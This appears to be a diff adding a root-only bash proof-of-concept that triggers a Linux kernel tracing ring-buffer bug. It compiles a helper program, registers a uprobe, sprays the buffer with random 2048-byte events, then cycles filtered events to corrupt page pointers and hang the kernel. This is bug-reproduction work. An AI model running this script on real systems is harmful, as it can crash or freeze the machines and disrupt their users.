@@ -1,0 +1,187 @@
+#!/bin/bash
+
+# Check command will test whether the specified tool has
+# been installed. However this does not ensure the command
+# will function as expected.
+check_command() {
+	if [ -z "$(which $1 2>/dev/null)" ]; then
+		echo "$0: Must install $1 before executing POC program"
+		exit 1
+	fi
+}
+check_command id
+check_command stat
+check_command grep
+check_command gcc
+check_command realpath
+check_command nm
+check_command dd
+check_command head
+check_command awk
+
+# This command must be executed using root user.
+if [ "$(id -u)" != "0" ]; then
+	echo "$0: Must be executed with root privilege"
+	exit 1
+fi
+
+# Tracefs must be mounted so that we could operate ring buffer.
+if [ -z "$(stat -f /sys/kernel/debug/tracing 2>/dev/null \
+	| grep -E 'Type: (tracefs|debugfs)')" ]; then
+	echo "$0: Trace filesystem must be mounted and accessible"
+	exit 1
+fi
+
+# Compile the rbwrite program, which will be generating
+# trace events once executed, filling the ring buffer.
+if [ -e rbwrite ]; then
+	rm rbwrite
+fi
+gcc -Wl,-Ttext-segment=0x0 -x c -o rbwrite - << '===rbwrite.c==='
+#define _GNU_SOURCE
+#include <sys/types.h>
+#include <sched.h>
+#include <stdio.h>
+#include <unistd.h>
+#include <errno.h>
+
+volatile long addr;
+void rbwrite(const char* input) {
+	addr = (long)input;
+}
+
+int main(int argc, char** argv) {
+	if(argc < 2) {
+		errno = EINVAL;
+		perror("insufficient arguments");
+		return -1;
+	}
+	cpu_set_t cpuset;
+	CPU_ZERO(&cpuset);
+	CPU_SET(0, &cpuset);
+	if(sched_setaffinity(getpid(), sizeof(cpuset), &cpuset) < 0) {
+		perror("sched_setaffinity");
+		return -1;
+	}
+	if(sched_yield() < 0) {
+		perror("sched_yield");
+		return -1;
+	}
+	rbwrite(argv[1]);
+	return 0;
+}
+===rbwrite.c===
+if [ ! "(" -x rbwrite ")" ]; then
+	echo "$0: Cannot compile the rbwrite program"
+	exit 1
+fi
+
+# Determine the absolute path of rbwrite program and
+# offset of the rbwrite symbol in program.
+RBWRITE_PATH="$(realpath rbwrite)"
+if [ -z "$RBWRITE_PATH" ]; then
+	echo "$0: Unexpected missing rbwrite program"
+	exit 1
+fi
+RBWRITE_OFFSET=$(nm $RBWRITE_PATH | grep rbwrite | awk '{print $1}')
+if [ -z "$RBWRITE_OFFSET" ]; then
+	echo "$0: Unexpected unretrivable offset of rbwrite"
+	exit 1
+fi
+
+# Setup uprobe event for the desired event of rbwrite.
+TRACING_BASEDIR="/sys/kernel/debug/tracing"
+UPROBE_EVENTS="$TRACING_BASEDIR/uprobe_events"
+INSTANCE_BASEDIR="$TRACING_BASEDIR/instances/rbdetonate"
+RBWRITE_BASEDIR="$INSTANCE_BASEDIR/events/rbdetonate/rbwrite"
+echo > "$INSTANCE_BASEDIR/trace"
+echo '!hist:keys=common_pid.execname,common_timestamp' >> $RBWRITE_BASEDIR/trigger 2>/dev/null #may fail
+echo 0 > "$RBWRITE_BASEDIR/enable" 2>/dev/null # may fail
+echo "-:rbdetonate/rbwrite" >> $UPROBE_EVENTS
+RBWRITE_FETCHARG1=""
+case "$(uname -m)" in
+	x86_64)    RBWRITE_FETCHARG1="%di";;
+	i386|i686) RBWRITE_FETCHARG1="%ax";;
+	arm)       RBWRITE_FETCHARG1="%r0";;
+	aarch64)   RBWRITE_FETCHARG1="%x0";;
+	*)         echo "$0: Unsupported CPU architecture"; exit 1;;
+esac
+echo "p:rbdetonate/rbwrite $RBWRITE_PATH:0x$RBWRITE_OFFSET \
+      input=+0($RBWRITE_FETCHARG1):string head=+0($RBWRITE_FETCHARG1):s8" >> $UPROBE_EVENTS
+mkdir -p "/sys/kernel/debug/tracing/instances/rbdetonate"
+if [ ! "(" -d $RBWRITE_BASEDIR ")" ]; then
+	echo "$0: Cannot create trace probe for rbwrite"
+	exit 1
+fi
+echo "overwrite" > "$INSTANCE_BASEDIR/trace_options"
+echo 1 > "$INSTANCE_BASEDIR/tracing_on"
+echo 1 > "$RBWRITE_BASEDIR/enable"
+
+# The purpose of the followed statement is to disable
+# uprobe handler function to use the per-CPU cache
+# "trace_buffered_event" so that "ring_buffer_lock_reserve"
+# will always be called when large events are generated.
+#
+# Setting this will cause either "ring_buffer_time_stamp_abs"
+# evaluated to true or "tr->no_filter_buffering_ref" set
+# to true, enforcing "trace_buffered_event" not to be used.
+#
+# This may also fail for the older version of linux that
+# has no hist enabled, and they are likely not to have
+# the per-CPU cache "trace_buffered_event".
+echo 'hist:key=common_pid.execname,common_timestamp' >> $RBWRITE_BASEDIR/trigger 2>/dev/null
+
+# Large enough random data of 2048 bytes that will be used
+# for generating pieces of events.
+PAYLOAD2048B=$(dd if=/dev/urandom bs=2048 count=1 2>/dev/null | base64 -w 0 | head -c 2048)
+
+# Spray buffer pages until all buffer_page->read field
+# are non-zero value. This is done by repetitively
+# writing to the 0-th CPU buffer.
+SPRAY_INCOMPLETE=true
+for j in {1..1000}; do
+	for i in {1..200}; do $RBWRITE_PATH $PAYLOAD2048B; done # faster spraying
+	SPRAY_CONDITION="$(head $INSTANCE_BASEDIR/trace | grep entries-in-buffer/entries-written | awk '{print $3}')"
+	ENTRIES_INBUFFER=$(echo "$SPRAY_CONDITION" | awk -F/ '{print $1}')
+	ENTRIES_WRITTEN=$(echo "$SPRAY_CONDITION" | awk -F/ '{print $2}')
+	if [ $ENTRIES_INBUFFER -lt $ENTRIES_WRITTEN ]; then
+		SPRAY_INCOMPLETE=false
+		break
+	fi
+done
+if $SPRAY_INCOMPLETE; then
+	echo "$0: Cannot spray buffers, uprobe maybe invalid"
+	exit 1
+fi
+
+# Common function to nonblockingly clear the current
+# tracing pipe of our instance. And the "dd" command
+# may trigger the ring buffer detonator and hungs.
+clear_ringbuffer() {
+	CLEAR_INCOMPLETE=true
+	while $CLEAR_INCOMPLETE; do
+		CLEAR_RESULT="$(dd if=$INSTANCE_BASEDIR/trace_pipe iflag=nonblock bs=4096 count=32768 2>/dev/null | wc -c)"
+		if [ $CLEAR_RESULT -eq "0" ]; then
+			CLEAR_INCOMPLETE=false
+		fi
+	done
+}
+clear_ringbuffer
+
+# HEAR ME! HEAR ME! This is the show!
+#
+# We will try to construct the condition such that commit_page,
+# head_page and tail_page points to the same page, generated
+# from "ring_buffer_lock_reserve" followed by
+# "ring_buffer_discard_commit".
+echo 'head == 0' > "$RBWRITE_BASEDIR/filter"
+for i in {1..8192}; do
+	$RBWRITE_PATH $PAYLOAD2048B
+	clear_ringbuffer
+	$RBWRITE_PATH ""
+	clear_ringbuffer
+done
+
+# Resign when there's nothing buggy happened.
+echo "Nothing buggy has been detected"
+exit 0
